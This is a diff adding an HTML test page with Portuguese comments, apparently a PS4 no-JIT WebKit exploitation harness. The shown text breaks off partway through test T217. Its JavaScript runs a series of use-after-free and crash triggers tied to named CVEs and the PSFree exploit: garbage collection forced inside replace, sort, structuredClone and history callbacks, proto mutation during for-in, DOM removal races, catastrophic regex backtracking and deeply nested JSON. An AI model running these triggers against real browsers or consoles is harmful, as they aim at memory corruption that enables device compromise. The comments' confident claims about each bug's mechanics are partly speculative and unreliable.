@@ -1,0 +1,1478 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Testes09 — LLInt / No-JIT / C++ Native UAF</title></head>
+<body>
+
+<p><strong>ABORDAGEM CORRETA PARA PS4 NO-JIT:</strong>
+Sem loops de warmup DFG/FTL. GC via ArrayBuffer grande.
+Vetores: C++ nativo UAF, YARR, DOM/WebCore, sort+GC, for-in+proto, structuredClone.</p>
+<p>CVEs: CVE-2017-2491, CVE-2023-28205, CVE-2022-22620, CVE-2022-42799, CVE-2018-4441,
+CVE-2019-8375, CVE-2018-4442, JSPropertyNameEnumerator UAF, YARR crashes.</p>
+
+<button onclick="runAll()">RODAR TODOS</button>
+<br><br>
+<button onclick="t201()">T201</button>
+<button onclick="t202()">T202</button>
+<button onclick="t203()">T203</button>
+<button onclick="t204()">T204</button>
+<button onclick="t205()">T205</button>
+<button onclick="t206()">T206</button>
+<button onclick="t207()">T207</button>
+<button onclick="t208()">T208</button>
+<button onclick="t209()">T209</button>
+<button onclick="t210()">T210</button>
+<button onclick="t211()">T211</button>
+<button onclick="t212()">T212</button>
+<button onclick="t213()">T213</button>
+<button onclick="t214()">T214</button>
+<button onclick="t215()">T215</button>
+<button onclick="t216()">T216</button>
+<button onclick="t217()">T217</button>
+<button onclick="t218()">T218</button>
+<button onclick="t219()">T219</button>
+<button onclick="t220()">T220</button>
+<button onclick="t221()">T221</button>
+<button onclick="t222()">T222</button>
+<button onclick="t223()">T223</button>
+<button onclick="t224()">T224</button>
+<button onclick="t225()">T225</button>
+
+<div id="dom-area" style="display:none"></div>
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+// GC correto para PS4 LLInt: alocacoes grandes de ArrayBuffer
+// nao usa loops de warmup JIT — apenas pressao de memoria
+function gc(){
+  for(let i = 0; i < 10; i++){
+    let ab = new ArrayBuffer(1024 * 1024 * 10); // 10MB por iteracao
+  }
+}
+
+// GC agressivo: versao mais pesada
+function gcHeavy(){
+  for(let i = 0; i < 30; i++){
+    let ab = new ArrayBuffer(1024 * 1024 * 10);
+  }
+}
+
+function runAll(){
+  log('=== RODAR TODOS: inicio ===');
+  t201(); t202(); t203(); t204(); t205();
+  t206(); t207(); t208(); t209(); t210();
+  t211(); t212(); t213(); t214(); t215();
+  t216(); t217(); t218(); t219(); t220();
+  t221(); t222(); t223(); t224(); t225();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// T201 — CVE-2017-2491 EXATO: JSC::CachedCall UAF via String.prototype.replace
+// Vector<JSValue> m_arguments nao e escaneado pelo GC (C++ heap, nao JS heap).
+// GC durante o callback de replace libera os JSString arguments — UAF.
+// phoenhex Pwn2Own 2017 — funciona sem JIT algum.
+function t201(){
+  log('Teste 201: inicio');
+  try {
+    const re = /a/g;
+    let callN = 0;
+    // Criar muitos JSStrings para rechear o heap
+    const strs = [];
+    for(let i = 0; i < 500; i++) strs.push('str_' + i + '_padding_data');
+
+    function replaceCb(match){
+      callN++;
+      strs.length = 0; // soltar referencias — GC pode coletar os JSStrings
+      gc();            // triggerar GC: m_arguments pode ter dangling pointer
+      return match.toUpperCase();
+    }
+
+    // String com muitas ocorrencias de 'a' — cada match chama replaceCb
+    const target = 'a'.repeat(200);
+    try { target.replace(re, replaceCb); } catch(e){}
+
+    // Versao 2: replace com regex e funcao que cria novos objetos pos-GC
+    const strs2 = [];
+    for(let i = 0; i < 500; i++) strs2.push({ id: i, data: new Uint8Array(32) });
+    const re2 = /\w+/g;
+    function replaceCb2(match, offset, str){
+      strs2.length = 0;
+      gc();
+      // Tentar usar 'str' (terceiro argumento) que e um JSString armazenado
+      // em Vector<JSValue> m_arguments — pode ser UAF pos-GC
+      try { return str.slice(offset, offset + 1).toUpperCase(); } catch(e){ return 'X'; }
+    }
+    try { 'hello world foo bar'.replace(re2, replaceCb2); } catch(e){}
+  } catch(e){}
+  log('Teste 201: fim');
+}
+
+// T202 — CVE-2023-28205 EXATO: structuredClone UAF via Vector nao-scaneado
+// SerializedScriptValue.cpp usa Vector<JSObject*,32> outputObjectStack,
+// Vector<JSMap*,4> mapStack, Vector<JSSet*,4> setStack — nao registrados como GC roots.
+// GC durante desserializacao libera objetos ainda referenciados pelo Vector.
+function t202(){
+  log('Teste 202: inicio');
+  try {
+    // Estrutura: Map aninhado em objeto aninhado em Set aninhado
+    // Durante o clone, os objetos intermediarios ficam so no Vector nao-GC
+    function buildDeepStructure(depth){
+      if(depth <= 0) return { leaf: new Uint8Array(64) };
+      const m = new Map();
+      const s = new Set();
+      const inner = buildDeepStructure(depth - 1);
+      m.set('key_' + depth, inner);
+      m.set('arr_' + depth, [inner, { extra: depth }]);
+      s.add(m);
+      s.add(inner);
+      return { map: m, set: s, obj: inner, depth: depth };
+    }
+
+    // Estruturas que ficam so no outputObjectStack durante o clone
+    const structures = [];
+    for(let i = 0; i < 20; i++) structures.push(buildDeepStructure(5));
+
+    // Primeira rodada: estruturas no GC roots normais
+    for(let s of structures){
+      try { structuredClone(s); } catch(e){}
+    }
+
+    // Soltar referencias ENQUANTO o clone esta em progresso via getter com GC
+    const evilObj = {};
+    let clonePhase = 0;
+    Object.defineProperty(evilObj, 'trigger', {
+      get: function(){
+        clonePhase++;
+        if(clonePhase === 1){
+          structures.length = 0; // soltar todos
+          gc();                   // GC: outputObjectStack tem dangling pointers
+        }
+        return 42;
+      }
+    });
+
+    const toClone = {
+      data: buildDeepStructure(8),
+      maps: [new Map([[1,2],[3,4]]), new Map([[5,6]])],
+      sets: [new Set([1,2,3]), new Set([new Map([[7,8]])])],
+      evil: evilObj, // getter com GC sera chamado durante clone
+    };
+
+    try { structuredClone(toClone); } catch(e){}
+
+    // postMessage com transferables: mesmo caminho de codigo
+    try {
+      const buf = new ArrayBuffer(1024);
+      const cyclic = { map: new Map([[1, buf]]), buf: buf };
+      postMessage(cyclic, '*', [buf]);
+    } catch(e){}
+  } catch(e){}
+  log('Teste 202: fim');
+}
+
+// T203 — Array.prototype.sort + GC no comparador (UAF classico, sem JIT)
+// Durante sort, os elementos do array ficam em buffers C++ internos do sort.
+// GC no comparador pode liberar elementos que o sort ainda referencia.
+function t203(){
+  log('Teste 203: inicio');
+  try {
+    // Criar array de objetos com dados no heap
+    const arr = [];
+    for(let i = 0; i < 200; i++){
+      arr.push({ val: Math.random(), data: new Uint8Array(64), id: i });
+    }
+
+    let sortCalls = 0;
+    function gcComparator(a, b){
+      sortCalls++;
+      if(sortCalls === 50){
+        gc(); // GC no meio do sort — elementos podem ser liberados
+      }
+      return a.val - b.val;
+    }
+
+    try { arr.sort(gcComparator); } catch(e){}
+
+    // Versao 2: array de strings — JSStrings em CachedCall durante sort
+    const strArr = [];
+    for(let i = 0; i < 200; i++) strArr.push('sort_str_' + Math.random() + '_' + i);
+
+    let strSortN = 0;
+    function gcStringComparator(a, b){
+      strSortN++;
+      if(strSortN % 30 === 0) gc();
+      return a < b ? -1 : a > b ? 1 : 0;
+    }
+    try { strArr.sort(gcStringComparator); } catch(e){}
+
+    // Versao 3: TypedArray.sort com comparador que faz GC
+    const ta = new Float64Array(200);
+    for(let i = 0; i < 200; i++) ta[i] = Math.random();
+    let taSortN = 0;
+    function gcTAComparator(a, b){
+      taSortN++;
+      if(taSortN === 80) gc();
+      return a - b;
+    }
+    try { ta.sort(gcTAComparator); } catch(e){}
+  } catch(e){}
+  log('Teste 203: fim');
+}
+
+// T204 — Array.prototype.sort + comparador que MUTA o array + GC
+// O sort acessa arr[i] e arr[j]; se o comparador muta o array (muda length,
+// deleta elementos, muda tipos), o sort acessa memoria invalida.
+function t204(){
+  log('Teste 204: inicio');
+  try {
+    const arr = [];
+    for(let i = 0; i < 100; i++) arr.push(Math.random());
+
+    let mutCalls = 0;
+    function mutatingComparator(a, b){
+      mutCalls++;
+      if(mutCalls === 20){
+        arr.length = 10;     // encolher o array durante o sort
+        gc();
+      }
+      if(mutCalls === 40){
+        arr.push(99, 88, 77); // expandir apos encolher
+      }
+      if(mutCalls === 60){
+        arr[0] = { valueOf(){ return 0; } }; // mudar tipo de elemento
+      }
+      return a - b;
+    }
+    try { arr.sort(mutatingComparator); } catch(e){}
+
+    // Versao 2: comparador que deleta elementos durante o sort
+    const arr2 = new Array(100).fill(0).map(function(_, i){ return i; });
+    let del2N = 0;
+    try {
+      arr2.sort(function(a, b){
+        del2N++;
+        if(del2N === 30){ delete arr2[50]; delete arr2[51]; gc(); }
+        return a - b;
+      });
+    } catch(e){}
+
+    // Versao 3: comparador que muda o proto do array
+    const arr3 = new Array(50).fill(0).map(function(_, i){ return i; });
+    let protoN = 0;
+    try {
+      arr3.sort(function(a, b){
+        protoN++;
+        if(protoN === 25){
+          Object.setPrototypeOf(arr3, { length: 5 }); // proto com length falso
+          gc();
+        }
+        return a - b;
+      });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 204: fim');
+}
+
+// T205 — CVE-2022-22620: History API UAF (PSFree exploit base)
+// history.pushState/replaceState cria HistoryItem que aponta para Document;
+// navegacao rapida (go/back/forward) pode liberar o Document enquanto
+// HistoryItem ainda tem ponteiro para ele. Funciona sem JIT.
+function t205(){
+  log('Teste 205: inicio');
+  try {
+    // Criar muitos estados de historico
+    for(let i = 0; i < 50; i++){
+      try {
+        history.pushState(
+          { id: i, buf: new ArrayBuffer(1024), data: new Array(100).fill(i) },
+          'state_' + i,
+          '#s' + i
+        );
+      } catch(e){}
+    }
+    // Navegar rapidamente de volta — liberando Document/HistoryItems
+    for(let i = 0; i < 20; i++){
+      try { history.go(-2); }      catch(e){}
+      try { history.go(1); }       catch(e){}
+      try { history.back(); }      catch(e){}
+      try { history.forward(); }   catch(e){}
+    }
+    // GC durante navegacao
+    for(let i = 0; i < 10; i++){
+      try { history.replaceState({ gc: i, ab: new ArrayBuffer(512) }, '', '#r' + i); } catch(e){}
+      gc();
+      try { history.back(); }    catch(e){}
+      try { history.forward(); } catch(e){}
+    }
+    // pushState com ArrayBuffer (pode triggerar serialization path especial)
+    try {
+      const bigState = { data: new ArrayBuffer(65536), arr: new Array(1000).fill(0) };
+      history.pushState(bigState, '', '#big');
+    } catch(e){}
+    gc();
+    try { history.back(); } catch(e){}
+  } catch(e){}
+  log('Teste 205: fim');
+}
+
+// T206 — JSPropertyNameEnumerator UAF via __proto__ mutation + GC (LLInt)
+// JSPropertyNameEnumerator armazena o StructureID do objeto durante for-in;
+// mudar __proto__ durante o loop invalida o StructureID mas o enumerador nao sabe.
+// Este bug existe ao nivel do LLInt — sem JIT necessario.
+function t206(){
+  log('Teste 206: inicio');
+  try {
+    // PoC derivado de CVE-2018-4416: for-in + __proto__ mutation + GC
+    function enumBug(obj){
+      let result = null;
+      gc(); // GC antes do for-in para settar sticky mark
+      for(let k in obj){
+        obj.__proto__ = {}; // mudar __proto__ invalida StructureID no enumerador
+        gc();               // GC: enumerador tem StructureID stale
+        result = obj[k];    // acesso com IC stale — pode ser UAF
+      }
+      return result;
+    }
+
+    // Objeto 'target' cujo proto sera trocado
+    const target = { a: 1, b: 2, c: 3, d: 4, e: 5 };
+    for(let i = 0; i < 30; i++){
+      try {
+        const o = { a: 1, b: 2, c: 3, d: 4, e: 5 };
+        enumBug(o);
+      } catch(e){}
+    }
+
+    // Versao 2: obj tem muitas propriedades + proto com getter
+    const bigObj = {};
+    for(let i = 0; i < 50; i++) bigObj['prop_' + i] = i;
+    const protoWithGetter = {};
+    Object.defineProperty(protoWithGetter, 'injected', {
+      get: function(){ gc(); return 'INJECTED'; },
+      enumerable: true, configurable: true
+    });
+    for(let i = 0; i < 30; i++){
+      try {
+        const o2 = Object.assign({}, bigObj);
+        for(let k in o2){
+          o2.__proto__ = protoWithGetter; // mudar para proto com getter
+        }
+      } catch(e){}
+    }
+
+    // Versao 3: Proxy no proto chain
+    const proxyProto = new Proxy({}, {
+      has: function(t, k){ gc(); return false; },
+      get: function(t, k){ gc(); return undefined; }
+    });
+    for(let i = 0; i < 30; i++){
+      try {
+        const o3 = { x: 1, y: 2, z: 3 };
+        for(let k in o3){
+          o3.__proto__ = proxyProto;
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 206: fim');
+}
+
+// T207 — YARR: catastrophic backtracking (sem JIT — YARR e C++ puro)
+// O motor de regex YARR interpreta padroes complexos em C++;
+// backtracking catastrofico pode crashar o processo por timeout ou stack overflow.
+function t207(){
+  log('Teste 207: inicio');
+  try {
+    // Padroes classicos de catastrophic backtracking
+    const patterns = [
+      // (a+)+ em string que nao casa — backtracking exponencial
+      [/(a+)+$/, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaac'],
+      [/(a|a)+$/, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaac'],
+      // Lookahead + backtracking
+      [/(?=a+)a+b$/, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaac'],
+      // Grupos opcionais aninhados
+      [/(a?a?a?a?a?)(a?a?a?a?a?)(a?a?a?a?a?)$/, 'aaaaaaaaaaaaaaa'],
+      // Alternancia com overlap
+      [/(a|ab)+c$/, 'ababababababababababababababababc'],
+      // Repeticao aninhada com quantificadores
+      [/([a-z]+)*$/, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'],
+      // Named group com backtracking
+      [/(?<x>a+)+$/, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaac'],
+      // Lookahead negativo com backtracking
+      [/((?!b)a)+b$/, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac'],
+    ];
+
+    for(let [re, str] of patterns){
+      try {
+        // Usar setTimeout para nao bloquear completamente
+        let done = false;
+        const start = Date.now();
+        try {
+          re.test(str);
+          done = true;
+        } catch(e){ done = true; }
+        // Se demorou mais de 500ms, o crash provavelmente ja ocorreu ou foi contido
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 207: fim');
+}
+
+// T208 — YARR: padroes extremos de lookahead/lookbehind/Unicode
+// YARR tem caminhos separados para Unicode, named groups, lookbehind;
+// combinacoes complexas podem causar OOB ou stack overflow no compilador YARR.
+function t208(){
+  log('Teste 208: inicio');
+  try {
+    // Lookbehind com grupos nomeados aninhados
+    const complexPatterns = [
+      /(?<=(?<a>\w+)\s)(?<b>\d+)/u,
+      /(?<!(?<neg>[A-Z]+))(?<pos>\w+)/u,
+      // Unicode property escapes
+      /\p{Emoji_Presentation}+/gu,
+      /\p{Script=Han}+/gu,
+      /\p{ID_Start}\p{ID_Continue}*/u,
+      // Grupos nomeados com mesmos nomes em alternancia (invalido em ES mas YARR pode ter bug)
+      // Named groups em lookahead
+      /(?=(?<x>\d+))(?<y>[a-z]+)/u,
+      // Lookbehind variavel comprimento
+      /(?<=\w{1,100})\d+/u,
+      // Combinacao extrema
+      /(?<g1>(?<=(?<g2>\w+))\d+)(?=(?<g3>[a-z]+))/u,
+    ];
+
+    const testStrs = [
+      'hello 123 world',
+      '\u{1F600}\u{1F601}abc',
+      '\u4E2D\u6587\u6D4B\u8BD5',
+      'test1234test',
+      'UPPER lower 1234',
+      'a'.repeat(100) + '12345',
+    ];
+
+    for(let re of complexPatterns){
+      for(let s of testStrs){
+        try { re.test(s); }              catch(e){}
+        try { s.match(re); }             catch(e){}
+        try { s.replace(re, 'X'); }      catch(e){}
+        try { [...s.matchAll(re)]; }     catch(e){}
+      }
+    }
+
+    // Regex com muitos grupos — pode causar OOB no array de grupos YARR
+    const manyGroups = new RegExp('(' + 'a?'.repeat(100) + ')');
+    try { manyGroups.exec('a'.repeat(100)); } catch(e){}
+
+    // Regex com backreference para grupo nao-existente
+    try { new RegExp('(a)\\2').test('aa'); } catch(e){}
+
+    // Flags invalidas em runtime (via new RegExp dinamico)
+    for(let flags of ['g', 'gi', 'gim', 'gimsuy', 'd', 'gd', 'gimsud']){
+      try {
+        const re2 = new RegExp('\\w+', flags);
+        re2.exec('test');
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 208: fim');
+}
+
+// T209 — String.prototype.split com regex + GC durante execucao
+// split com regex usa YARR internamente; os pedacos sao JSStrings alocadas;
+// GC durante o split pode libertar strings intermediarias.
+function t209(){
+  log('Teste 209: inicio');
+  try {
+    // String grande para split
+    const bigStr = ('hello world foo bar baz qux ').repeat(500);
+    const re = /\s+/g;
+
+    // Split normal — aquecer o caminho C++
+    for(let i = 0; i < 10; i++){
+      try { bigStr.split(re); } catch(e){}
+    }
+
+    // Split com regex que tem grupos de captura (grupos ficam no resultado)
+    const reWithGroups = /(\s+)(\w)/;
+    const strWithGroups = 'hello world foo bar baz';
+    try { strWithGroups.split(reWithGroups); } catch(e){}
+
+    // Split com limite que forca alocacao parcial
+    try { bigStr.split(re, 100); }  catch(e){}
+    try { bigStr.split(re, 0); }    catch(e){}
+    try { bigStr.split(re, -1); }   catch(e){}
+
+    // split com separador que e um Proxy (valueOf chamado pelo YARR)
+    const proxySep = new Proxy(/\s+/, {
+      get: function(t, k){
+        if(k === Symbol.split) return function(str, limit){
+          gc(); // GC durante split
+          return String.prototype.split.call(str, t, limit);
+        };
+        return Reflect.get(t, k);
+      }
+    });
+    try { bigStr.split(proxySep); } catch(e){}
+
+    // split com string gigante e separador raro — muitas alocacoes
+    const giantStr = 'a'.repeat(100000);
+    try { giantStr.split('b'); }    catch(e){} // nenhum match — retorna array de 1 elemento
+    gc();
+    try { giantStr.split('a'); }    catch(e){} // 100000 matches — 100000 strings vazias
+  } catch(e){}
+  log('Teste 209: fim');
+}
+
+// T210 — Array.prototype.splice com getter em element que faz GC (CVE-2018-4441 area)
+// splice copia elementos internamente em C++;
+// getter em elemento pode triggerar GC durante a copia.
+function t210(){
+  log('Teste 210: inicio');
+  try {
+    // Array com getter em elemento no meio
+    const arr = new Array(200).fill(0).map(function(_, i){ return i; });
+    Object.defineProperty(arr, '100', {
+      get: function(){
+        gc(); // GC durante splice — elementos copiados podem ser liberados
+        return 9999;
+      },
+      enumerable: true, configurable: true
+    });
+
+    try { arr.splice(50, 100, 'inserted'); } catch(e){}
+
+    // unshift: adiciona no inicio, deslocando todos os elementos
+    // CVE-2018-4441: unshiftCount pode ter overflow em arrays grandes
+    const arr2 = new Array(1000).fill(0).map(function(_, i){ return i; });
+    // Tornar sparse para usar ArrayStorage (mais vulneravel)
+    delete arr2[500];
+    delete arr2[750];
+    try { arr2.unshift(1, 2, 3, 4, 5, 6, 7, 8, 9, 10); } catch(e){}
+
+    // copyWithin com overlap + getter no destino
+    const arr3 = new Array(100).fill(0).map(function(_, i){ return i; });
+    Object.defineProperty(arr3, '50', {
+      set: function(v){ gc(); },
+      get: function(){ return -1; },
+      enumerable: true, configurable: true
+    });
+    try { arr3.copyWithin(40, 0, 60); } catch(e){} // overlap [40..60) <- [0..60)
+
+    // splice que deixa o array maior que a capacidade interna
+    const arr4 = [];
+    arr4.length = 10;
+    arr4[9] = 'last';
+    try { arr4.splice(5, 0, ...new Array(100).fill('inserted')); } catch(e){}
+    gc();
+    try { arr4.splice(0, 50); } catch(e){}
+  } catch(e){}
+  log('Teste 210: fim');
+}
+
+// T211 — JSON.parse profundidade extrema: stack overflow no LLInt
+// O parser JSON e C++ puro; profundidade > ~10000 pode causar stack overflow.
+// Sem JIT envolvido — o crash e no parser C++.
+function t211(){
+  log('Teste 211: inicio');
+  try {
+    // Construir JSON profundamente aninhado
+    function makeDeepJSON(depth, type){
+      if(type === 'array'){
+        let j = '1';
+        for(let i = 0; i < depth; i++) j = '[' + j + ']';
+        return j;
+      } else {
+        let j = '"leaf"';
+        for(let i = 0; i < depth; i++) j = '{"k":' + j + '}';
+        return j;
+      }
+    }
+
+    // Profundidades crescentes ate causar stack overflow
+    for(let depth of [100, 500, 1000, 2000, 5000, 10000, 20000, 50000]){
+      try {
+        const json = makeDeepJSON(depth, depth % 2 === 0 ? 'array' : 'object');
+        JSON.parse(json);
+      } catch(e){}
+    }
+
+    // JSON com string gigante (pode causar OOB em parser)
+    try {
+      const bigStr = '"' + 'a'.repeat(10000000) + '"';
+      JSON.parse(bigStr);
+    } catch(e){}
+
+    // JSON com numero de alta precisao
+    try { JSON.parse('1e' + '9'.repeat(1000)); } catch(e){}
+    try { JSON.parse('{"a":' + '1e'.repeat(100) + '1}'); } catch(e){}
+
+    // JSON com muitas propriedades no mesmo objeto
+    try {
+      const parts = [];
+      for(let i = 0; i < 100000; i++) parts.push('"k' + i + '":' + i);
+      JSON.parse('{' + parts.join(',') + '}');
+    } catch(e){}
+  } catch(e){}
+  log('Teste 211: fim');
+}
+
+// T212 — Generator + GC: frame do generator pode ser coletado durante yield
+// Quando um generator esta em pausa em 'yield', seu frame fica na heap;
+// se as referencias ao generator sao perdidas e o GC roda, o frame pode ser liberado.
+function t212(){
+  log('Teste 212: inicio');
+  try {
+    function* deepGen(n){
+      const data = new Uint8Array(1024); // dado no frame do generator
+      for(let i = 0; i < n; i++){
+        yield data[i % 1024]; // pausa aqui com 'data' no frame
+      }
+    }
+
+    // Criar generators, avancar alguns, depois GC
+    const gens = [];
+    for(let i = 0; i < 100; i++){
+      const g = deepGen(1000);
+      g.next(); // avancar: frame fica em pause com 'data' vivo
+      gens.push(g);
+    }
+
+    gc(); // GC com frames de generators pausados no heap
+
+    // Tentar resumir generators apos GC — frame pode ter sido coletado
+    for(let g of gens){
+      try { g.next(); } catch(e){}
+      try { g.return('done'); } catch(e){}
+    }
+
+    // Versao 2: generator com yield* delegado + GC
+    function* inner(){
+      yield new ArrayBuffer(1024); // dado grande no frame
+      gc();                         // GC dentro do generator
+      yield new Uint32Array(256);
+    }
+    function* outer(){
+      yield* inner(); // delegacao: ambos os frames ficam na heap
+      yield 'final';
+    }
+    const og = outer();
+    try { og.next(); } catch(e){} // avancar para inner
+    gc();
+    try { og.next(); } catch(e){} // retomar pos-GC
+    try { og.next(); } catch(e){} // finalizar
+
+    // Versao 3: generator em Array que e descartado durante iteracao
+    const genArr = [];
+    for(let i = 0; i < 50; i++) genArr.push(deepGen(100));
+    // Avancar todos um passo
+    for(let g of genArr) try { g.next(); } catch(e){}
+    // Descartar metade
+    genArr.splice(0, 25);
+    gc();
+    // Resumir os restantes
+    for(let g of genArr) try { g.next(); } catch(e){}
+  } catch(e){}
+  log('Teste 212: fim');
+}
+
+// T213 — Promise chain + GC durante microtask (WebCore event loop UAF)
+// Promises em cadeia criam continuacoes na microtask queue;
+// GC entre microtasks pode liberar objetos que a continuacao ainda referencia.
+function t213(){
+  log('Teste 213: inicio');
+  try {
+    // Dados alocados fora das promises — referencias podem ser perdidas
+    let sharedData = { buf: new ArrayBuffer(65536), arr: new Array(1000).fill(Math.random()) };
+
+    // Chain de 50 promises, cada uma com GC
+    let chain = Promise.resolve(sharedData);
+    for(let i = 0; i < 50; i++){
+      chain = chain.then(function(data){
+        gc(); // GC entre microtasks
+        if(data && data.buf) data.buf = new ArrayBuffer(1024); // re-alocacao
+        return data;
+      });
+    }
+    chain.catch(function(){});
+
+    // Soltar a referencia ao sharedData enquanto promises ainda processam
+    setTimeout(function(){
+      sharedData = null;
+      gc();
+    }, 0);
+
+    // Promise.all com muitas promises + GC
+    const many = [];
+    for(let i = 0; i < 200; i++){
+      many.push(new Promise(function(resolve){
+        resolve({ id: i, data: new Uint8Array(32) });
+      }));
+    }
+    Promise.all(many).then(function(results){
+      gc(); // GC com results array na stack
+      return results.length;
+    }).catch(function(){});
+
+    // Promise que rejeita com objeto grande + GC no handler
+    Promise.reject({ big: new ArrayBuffer(65536), id: 9999 })
+      .catch(function(err){
+        gc();
+        return err;
+      });
+  } catch(e){}
+  log('Teste 213: fim');
+}
+
+// T214 — DOM: removeChild + GC + acesso pos-remocao (WebCore UAF)
+// Ao remover um no do DOM, o WebCore decrementa refcount;
+// se o GC coleta o objeto JS antes do C++ processar a remocao, UAF no WebCore.
+function t214(){
+  log('Teste 214: inicio');
+  try {
+    const area = document.getElementById('dom-area');
+    if(!area) throw new Error('dom-area nao encontrado');
+
+    // Criar arvore DOM complexa
+    function buildTree(parent, depth, breadth){
+      if(depth <= 0) return;
+      for(let i = 0; i < breadth; i++){
+        const child = document.createElement('div');
+        child.setAttribute('data-id', depth + '_' + i);
+        child.textContent = 'node_' + depth + '_' + i;
+        parent.appendChild(child);
+        buildTree(child, depth - 1, breadth);
+      }
+    }
+
+    buildTree(area, 4, 3); // arvore 3^4 = 81 nos
+
+    // Coletar referencias a nos internos
+    const nodes = area.querySelectorAll('div');
+    const nodeRefs = Array.from(nodes);
+
+    // Remover nos enquanto referencias JS ainda existem
+    gc();
+    while(area.firstChild){
+      try { area.removeChild(area.firstChild); } catch(e){}
+    }
+    gc(); // GC: nodeRefs ainda tem ponteiros para nos removidos
+
+    // Tentar acessar nos removidos pos-GC
+    for(let node of nodeRefs){
+      try {
+        let t = node.textContent;
+        let id = node.getAttribute('data-id');
+        let p = node.parentNode; // deve ser null
+        node.appendChild(document.createTextNode('test'));
+      } catch(e){}
+    }
+
+    // Reconstruir e repetir com nos que tem event listeners
+    buildTree(area, 3, 3);
+    const nodes2 = Array.from(area.querySelectorAll('div'));
+    for(let node of nodes2){
+      node.addEventListener('click', function(){ gc(); });
+    }
+    gc();
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    gc();
+    // Disparar evento em nos removidos (pode referenciar handler liberado)
+    for(let node of nodes2){
+      try { node.dispatchEvent(new Event('click')); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 214: fim');
+}
+
+// T215 — MutationObserver + DOM removal + GC (WebCore UAF via observer callback)
+// MutationObserver registra callbacks que sao chamados apos mutacoes DOM;
+// se o elemento observado e removido e o GC coleta o nodo, o callback acessa UAF.
+function t215(){
+  log('Teste 215: inicio');
+  try {
+    const area = document.getElementById('dom-area');
+    if(!area) throw new Error('sem dom-area');
+
+    // Criar estrutura a ser observada
+    const container = document.createElement('div');
+    area.appendChild(container);
+    for(let i = 0; i < 50; i++){
+      const child = document.createElement('span');
+      child.textContent = 'child_' + i;
+      container.appendChild(child);
+    }
+
+    let observedNodes = [];
+    const observer = new MutationObserver(function(records){
+      gc(); // GC dentro do callback — records pode ter dangling nodes
+      for(let r of records){
+        for(let node of r.removedNodes){
+          observedNodes.push(node);
+          try { node.textContent; }     catch(e){}
+          try { node.parentNode; }      catch(e){}
+          try { node.nextSibling; }     catch(e){}
+        }
+      }
+    });
+
+    observer.observe(container, { childList: true, subtree: true, attributes: true });
+
+    // Remover filhos enquanto observer esta ativo
+    while(container.firstChild){
+      try { container.removeChild(container.firstChild); } catch(e){}
+    }
+
+    // GC: records de MutationObserver podem ter ponteiros para nos liberados
+    gc();
+
+    // Remover o proprio container observado
+    try { area.removeChild(container); } catch(e){}
+    gc();
+
+    // Acessar nos observados pos-GC
+    for(let node of observedNodes){
+      try { node.textContent = 'post_gc'; }      catch(e){}
+      try { node.remove(); }                      catch(e){}
+    }
+
+    observer.disconnect();
+  } catch(e){}
+  log('Teste 215: fim');
+}
+
+// T216 — CSS transition/animation + DOM removal + GC (WebCore layout UAF)
+// Quando um elemento com CSS animation e removido do DOM durante a animacao,
+// o WebCore pode acessar o RenderObject (C++) que foi liberado.
+function t216(){
+  log('Teste 216: inicio');
+  try {
+    const area = document.getElementById('dom-area');
+    if(!area) throw new Error('sem dom-area');
+
+    // Criar elementos com animacoes CSS via style inline
+    const animated = [];
+    for(let i = 0; i < 30; i++){
+      const el = document.createElement('div');
+      el.style.cssText = [
+        'width:100px', 'height:100px',
+        'transition:all 0.1s ease',
+        'animation:spin 0.1s linear infinite',
+        'transform:translateX(0px)',
+        'opacity:1'
+      ].join(';');
+      el.textContent = 'anim_' + i;
+      area.appendChild(el);
+      animated.push(el);
+    }
+
+    // Injetar keyframes
+    const style = document.createElement('style');
+    style.textContent = '@keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }';
+    document.head.appendChild(style);
+
+    // Forcar layout/reflow
+    let _ = area.offsetHeight;
+
+    // Triggerar transicoes
+    for(let el of animated){
+      el.style.transform = 'translateX(200px)';
+      el.style.opacity = '0.5';
+    }
+
+    // Remover durante animacao + GC
+    gc();
+    for(let el of animated){
+      try { area.removeChild(el); } catch(e){}
+    }
+    gc(); // GC: RenderObject dos elementos animados pode ser liberado
+
+    // Tentar modificar elementos removidos (stale RenderObject)
+    for(let el of animated){
+      try { el.style.transform = 'translateX(300px)'; } catch(e){}
+      try { el.getBoundingClientRect(); }               catch(e){}
+      try { el.offsetWidth; }                           catch(e){}
+    }
+
+    // Cleanup
+    try { document.head.removeChild(style); } catch(e){}
+  } catch(e){}
+  log('Teste 216: fim');
+}
+
+// T217 — CVE-2022-22620 variante: History + iframe + GC (PSFree-like)
+// PSFree exploita o destructor ~SerializedScriptValue via history navigation;
+// usar iframe com history.pushState e navigacao cruzada pode triggerar o mesmo UAF.
+function t217(){
+  log('Teste 217: inicio');
+  try {
+    // Criar iframe para navegacao de historico isolada
+    const iframe = document.createElement('iframe');
+    iframe.src = 'about:blank';
+    document.body.appendChild(iframe);
+
+    try {
+      const iWin = iframe.contentWindow;
+      if(iWin){
+        // pushState no iframe com SerializedScriptValue (buffer, objeto complexo)
+        for(let i = 0; i < 30; i++){
+          try {
+            iWin.history.pushState(
+              { id: i, data: new Array(100).fill(i), buf: new ArrayBuffer(512) },
+              '',
+              'about:blank#' + i
+            );
+          } catch(e){}
+        }
+        gc();
+        // Navegar de volta — triggera destrucao de HistoryItems com SerializedScriptValue
+        for(let i = 0; i < 10; i++){
+          try { iWin.history.go(-3); }   catch(e){}
+          gc();
+          try { iWin.history.go(2); }    catch(e){}
+          gc();
+          try { iWin.history.back(); }   catch(e){}
+          try { iWin.history.forward(); } catch(e){}
+        }
+      }
+    } catch(e){}
+
+    // Remover iframe enquanto historico ainda tem estados
+    gc();
